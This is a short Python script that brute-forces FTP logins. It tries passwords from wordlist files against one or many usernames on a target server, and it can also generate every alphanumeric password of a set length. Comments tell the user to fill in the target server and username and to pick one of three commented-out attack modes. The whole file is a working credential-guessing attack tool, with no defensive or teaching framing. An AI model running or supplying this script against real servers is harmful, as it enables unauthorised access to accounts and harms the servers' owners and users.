from ftplib import FTP
from getpass import getpass
import itertools
import string

def try_ftp_login(server, username, password):
    try:
        ftp = FTP(server)
        ftp.login(username, password)
        print(f"Success! Username: {username}, Password: {password}")
        ftp.quit()
        return True
    except Exception as e:
        print(f"Failed: Username: {username}, Password: {password}")
        return False

def brute_force_ftp_single_user(server, username, password_list):
    for password in password_list:
        if try_ftp_login(server, username, password):
            return password
    print("Password not found.")
    return None

def brute_force_ftp_multi_user(server, username_list, password_list):
    for user in username_list:
        for password in password_list:
            if try_ftp_login(server,user,password):
                return user, password
    print("Password not found.")
    return None

def generate_all_passwords(length):

    if length <= 0:
        raise ValueError("Password length must be greater than 0")

    # Define the character set to use (ASCII letters, digits)
    characters = string.ascii_letters + string.digits

    password_list = []
    
    # Generate all possible combinations of the given length
    for combination in itertools.product(characters, repeat=length):
        password_list.append(''.join(combination))
    
    return password_list

def main():
    server = 'ftp.example.com'  # Replace with the target FTP server
    username = 'admin'  # Replace with the target username

    with open('passwords.txt', 'r') as file:
        password_list = file.readlines()
    
    with open('users.txt', 'r') as file:
        username_list = file.readlines()


    #choose one of these
    #brute_force_ftp_single_user(server, username, password_list)
    #brute_force_ftp_multi_user(server,username_list,password_list)
    #brute_force_ftp_single_user(server,username,generate_all_passwords(3))

if __name__ == "__main__":
    main()
